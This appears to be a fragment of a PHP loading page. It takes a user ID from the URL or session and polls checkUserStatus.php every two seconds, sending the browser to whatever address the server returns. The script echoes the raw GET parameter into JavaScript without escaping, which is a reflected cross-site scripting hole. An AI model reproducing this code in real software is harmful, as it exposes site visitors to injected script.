<?php
$user_id = $_GET['user_id'] ?? '';
if (!$user_id) {
    // Try to get from session
    session_start();
    $user_id = $_SESSION['user_key'] ?? '';
    
    if (!$user_id) {
        die('Invalid user ID. Please go back and try again.');
    }
}
?>
<!DOCTYPE html>
<html lang="en" translate="no">
<head>
    <!-- ... keep existing head ... -->
</head>
<body>
    <div class="container">
        <!-- ... keep existing loading screen ... -->
    </div>
    
    <script>
    const userID = "<?php echo $user_id; ?>";
    
    // Fix polling to use checkUserStatus.php instead of check.php
    async function checkUserStatus() {
        try {
            const response = await fetch(`checkUserStatus.php?user_id=${encodeURIComponent(userID)}`);
            const data = await response.json();
            
            if (data.shouldRedirect && data.redirectTo) {
                window.location.href = data.redirectTo;
                return true;
            }
            
            return false;
        } catch (error) {
            console.log('Status check failed:', error);
            return false;
        }
    }
    
    // Start checking every 2 seconds
    const checkInterval = setInterval(async () => {
        const shouldRedirect = await checkUserStatus();
        if (shouldRedirect) {
            clearInterval(checkInterval);
        }
    }, 2000);
    
    // Initial check
    checkUserStatus();
    </script>
</body>
</html>
